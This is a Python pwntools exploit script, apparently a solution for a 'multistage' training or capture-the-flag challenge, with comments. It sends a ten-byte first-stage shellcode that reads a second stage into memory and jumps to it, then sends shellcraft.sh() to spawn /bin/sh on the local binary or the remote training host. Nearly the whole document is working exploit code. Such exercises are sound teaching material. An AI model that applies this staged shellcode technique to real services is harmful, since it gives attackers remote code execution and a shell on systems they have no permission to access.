from pwn import *

# asks for an imput of at most 10 bytes, so we have to perform a read to get the real shellcode and execute it

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
COMMANDS = """
b  *0x40123f
c
"""
context.arch = "amd64"

if args.REMOTE:
    c = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./multistage", gdbscript = COMMANDS)
        #input("wait")
    else:
        c = process("./multistage")

#load to the stack a shellcode which reads form input the real shellcode and then jump to this one.
#The real shellcode is loaded some bytes above the location of the first shellcode to avoid exiting the activation frame of the function or overwriting the location pointed by the rsp (when it tries and pushes the code of the execve it gives SIGSEGV because this would overwrite some of the area reserved to the shellcode placed there with the read syscall)
s1 = """
push rax
pop rsi
xor eax, eax
xor edi, edi
push 0x35
pop rdx
add rsi, rdx
syscall
jmp rsi
"""
sa1 = asm(s1)
s2 = shellcraft.sh()    #classic call to /bin/sh through execve
sa2 = asm(s2)
# print(s1 + s2)
c.send(sa1)
c.send(sa2)
c.interactive()
